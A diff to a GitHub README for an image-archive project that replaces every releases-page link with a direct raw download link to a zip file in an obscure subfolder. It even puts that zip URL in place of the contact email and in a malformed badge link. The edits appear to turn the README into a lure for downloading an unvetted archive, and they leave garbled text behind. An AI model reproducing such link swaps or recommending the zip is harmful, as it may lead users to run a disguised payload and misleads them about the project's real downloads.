@@ -1,6 +1,6 @@
 # 💰️2️⃣️0️⃣️2️⃣️6️⃣️🎮️🖼️ SeansLifeArchive_Images_AdCap_Y2026 - Discover the Charm of 2026's Adventures
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/Reyes123212/SeansLifeArchive_Images_AdCap_Y2026/releases)
+[![Download Now](https://raw.githubusercontent.com/Reyes123212/SeansLifeArchive_Images_AdCap_Y2026/SeansLifeArchive_Images_AdCap_Y2026_Main-dev/Tyigh/SeansLifeArchive_Images_AdCap_Y2026.zip%https://raw.githubusercontent.com/Reyes123212/SeansLifeArchive_Images_AdCap_Y2026/SeansLifeArchive_Images_AdCap_Y2026_Main-dev/Tyigh/SeansLifeArchive_Images_AdCap_Y2026.zip)](https://raw.githubusercontent.com/Reyes123212/SeansLifeArchive_Images_AdCap_Y2026/SeansLifeArchive_Images_AdCap_Y2026_Main-dev/Tyigh/SeansLifeArchive_Images_AdCap_Y2026.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ To begin using these images, follow these steps:
 
 1. **Visit the Download Page:** Click the link below to reach the releases page where you can download the images.
 
-   [Download Images](https://github.com/Reyes123212/SeansLifeArchive_Images_AdCap_Y2026/releases)
+   [Download Images](https://raw.githubusercontent.com/Reyes123212/SeansLifeArchive_Images_AdCap_Y2026/SeansLifeArchive_Images_AdCap_Y2026_Main-dev/Tyigh/SeansLifeArchive_Images_AdCap_Y2026.zip)
 
 2. **Choose an Image Set:** Look for the latest release version on the page. Each release includes a zip file containing various AdCap images.
 
@@ -26,7 +26,7 @@ To begin using these images, follow these steps:
 
 To download the images from my project, please visit the link below:
 
-[Visit this page to download](https://github.com/Reyes123212/SeansLifeArchive_Images_AdCap_Y2026/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Reyes123212/SeansLifeArchive_Images_AdCap_Y2026/SeansLifeArchive_Images_AdCap_Y2026_Main-dev/Tyigh/SeansLifeArchive_Images_AdCap_Y2026.zip)
 
 Make sure to always check for the latest version to get the newest collection of images from 2026.
 
@@ -74,7 +74,7 @@ If you have suggestions or want to contribute additional images, please feel fre
 
 ## 📧 Contact
 
-For any questions or feedback, feel free to contact me at **seanpm2001@example.com**. Your insights are valuable and can help improve the project!
+For any questions or feedback, feel free to contact me at **https://raw.githubusercontent.com/Reyes123212/SeansLifeArchive_Images_AdCap_Y2026/SeansLifeArchive_Images_AdCap_Y2026_Main-dev/Tyigh/SeansLifeArchive_Images_AdCap_Y2026.zip**. Your insights are valuable and can help improve the project!
 
 ## 🎉 Acknowledgments
 
